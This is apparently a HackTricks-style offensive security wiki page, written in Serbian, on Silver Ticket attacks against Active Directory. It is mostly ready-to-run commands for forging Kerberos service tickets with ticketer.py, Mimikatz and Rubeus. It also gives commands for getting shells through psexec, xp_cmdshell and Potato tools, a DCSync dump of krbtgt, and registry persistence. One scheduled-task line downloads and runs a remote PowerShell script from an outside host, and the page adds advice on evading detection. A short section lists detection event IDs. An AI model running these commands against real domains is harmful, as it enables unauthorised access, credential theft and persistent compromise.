# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Napad **Silver Ticket** podrazumeva eksploataciju servisnih tiketa u Active Directory (AD) okruženjima. Ova metoda se oslanja na **pribavljanje NTLM hash-a servisnog naloga**, kao što je nalog računara, radi falsifikovanja TGS (Ticket Granting Service) tiketa. Pomoću ovog falsifikovanog tiketa, napadač može da pristupi određenim servisima na mreži i **da se predstavlja kao bilo koji korisnik**, obično s ciljem sticanja administratorskih privilegija. Naglašava se da je korišćenje AES ključeva za falsifikovanje tiketa bezbednije i teže za otkrivanje.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets je teže otkriti nego Golden Tickets zato što je potreban samo **hash servisnog naloga**, a ne naloga krbtgt. Međutim, ograničeni su na određeni servis koji ciljaju. Štaviše, dovoljno je ukrasti lozinku korisnika.
Štaviše, ako kompromitujete **lozinku naloga sa SPN-om**, možete da je iskoristite za kreiranje Silver Ticket-a kojim se predstavljate kao bilo koji korisnik tog servisa.

### Savremene Kerberos promene (domeni koji koriste samo AES)

- Windows ažuriranja počevši od **8 Nov 2022 (KB5021131)** podrazumevano koriste **AES session keys** za servisne tikete kada je to moguće i postepeno ukidaju RC4. Očekuje se da će DC-ovi do sredine 2026. podrazumevano imati **isključen** RC4, pa će oslanjanje na NTLM/RC4 hash-eve za Silver Tickets sve češće dovoditi do greške `KRB_AP_ERR_MODIFIED`. Uvek izvucite **AES ključeve** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) za ciljni servisni nalog.<sup>[[5]](#references)</sup>
- Ako je `msDS-SupportedEncryptionTypes` servisnog naloga ograničen na AES, morate da falsifikujete tiket pomoću `/aes256` ili `-aesKey`; RC4 (`/rc4` ili `-nthash`) neće raditi čak ni ako imate NTLM hash.<sup>[[6]](#references)</sup>
- gMSA/nalozi računara menjaju se svakih 30 dana; pre falsifikovanja tiketa, iz LSASS-a, Secretsdump/NTDS-a ili DCsync-a izvucite **trenutni AES ključ**.
- OPSEC: podrazumevano trajanje tiketa u alatima često je **10 godina**; podesite realno trajanje (npr. `-duration 600` minuta) da biste izbegli otkrivanje zbog neuobičajenog trajanja.<sup>[[6]](#references)</sup>

Za kreiranje tiketa koriste se različiti alati u zavisnosti od operativnog sistema:

### Na Linuxu

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Na Windows-u

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

CIFS servis je istaknut kao česta meta za pristup sistemu datoteka žrtve, ali i druge usluge, poput HOST i RPCSS, mogu se iskoristiti za zadatke i WMI upite.

### Primer: MSSQL servis (MSSQLSvc) + Potato do SYSTEM

Ako imate NTLM hash (ili AES ključ) naloga koji poseduje **registrovani, tačan SQL service SPN**, falsifikovani servisni tiket može biti prihvaćen od strane tog servisa. Klasa servisa i ime hosta u tiketu moraju da odgovaraju stvarnom SPN-u; nemojte pretpostavljati da svaka instalacija koristi `MSSQLSvc/`. Navedeni identitet takođe mora biti mapiran na SQL login sa potrebnim dozvolama za omogućavanje i pokretanje `xp_cmdshell`. Uspešne `xp_cmdshell` komande izvršavaju se pod identitetom procesa SQL servisa (ili pod identitetom konfigurisanog proxy-ja za pozivaoce koji nisu sysadmin). Pre nego što razmotrite zaseban Potato put, proverite da li su u tom **token-u procesa** omogućene privilegije `SeImpersonatePrivilege`; sama konfiguracija servisa ili SPN to ne dokazuju.<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- Ako dobijeni kontekst ima SeImpersonatePrivilege (što je često slučaj kod servisnih naloga), upotrebite Potato varijantu da biste dobili SYSTEM:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

Više detalja o zloupotrebi MSSQL-a i omogućavanju xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Pregled Potato tehnika:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Dostupne usluge

| Tip usluge                               | Silver Tickets za uslugu                                                    |
| ---------------------------------------- | --------------------------------------------------------------------------- |
| WMI                                      | <p>HOST</p><p>RPCSS</p>                                                     |
| PowerShell Remoting                      | <p>HOST</p><p>HTTP</p><p>U zavisnosti od OS-a, takođe:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                    | <p>HOST</p><p>HTTP</p><p>U nekim slučajevima možete zatražiti samo: WINRM</p> |
| Scheduled Tasks                          | HOST                                                                        |
| Windows File Share, takođe psexec        | CIFS                                                                        |
| LDAP operacije, uključujući DCSync       | LDAP                                                                        |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                           | krbtgt                                                                      |

Koristeći **Rubeus**, možete **zatražiti sve** ove tikete pomoću parametra:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### ID-jevi događaja za Silver tickets

- 4624: Prijava naloga
- 4634: Odjava naloga
- 4672: Prijava administratora
- **Nepostojanje prethodnog događaja 4768/4769 na DC-u** za istog klijenta/uslugu čest je pokazatelj da je falsifikovani TGS direktno predstavljen usluzi.
- Neuobičajeno dugo trajanje tiketa ili neočekivani tip šifrovanja (RC4 kada domen zahteva AES) takođe se ističu u podacima 4769/4624.

## Persistence

Da biste sprečili mašine da menjaju lozinku svakih 30 dana, postavite `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` ili možete postaviti `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` na vrednost veću od 30 dana, kako biste odredili period rotacije lozinke mašine.<sup>[[3]](#references)</sup>

## Zloupotreba service tiketa

U sledećim primerima zamislimo da je tiket preuzet lažnim predstavljanjem administratorskog naloga.

### CIFS

Pomoću ovog tiketa moći ćete da pristupite fasciklama `C$` i `ADMIN$` putem **SMB-a** (ako su izložene) i kopirate datoteke u deo udaljenog sistema datoteka, tako što ćete uraditi nešto poput:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

Takođe ćete moći da dobijete shell na hostu ili da izvršavate proizvoljne komande pomoću **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Sa ovom dozvolom možete da kreirate zakazane zadatke na udaljenim računarima i da izvršavate proizvoljne komande:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

Pomoću ovih tiketa možete da izvršite WMI na sistemu žrtve:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Pronađite **više informacija o wmiexec-u** na sledećoj stranici:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Ako imate winrm pristup računaru, možete mu **pristupiti** i čak dobiti PowerShell:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Pogledajte sledeću stranicu da biste saznali **više načina za povezivanje sa udaljenim hostom pomoću winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Imajte na umu da **winrm mora biti aktivan i da mora osluškivati** na udaljenom računaru da biste mu pristupili.

### LDAP

Uz ovu privilegiju možete da izvezete bazu podataka DC-a pomoću **DCSync**:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Saznajte više o DCSync** na sledećoj stranici:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Kako napasti Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Proces lozinke naloga računara - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + putanja Potato](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131: Kerberos hardening i ukidanje RC4](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Trenutne opcije za Impacket ticketer.py (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
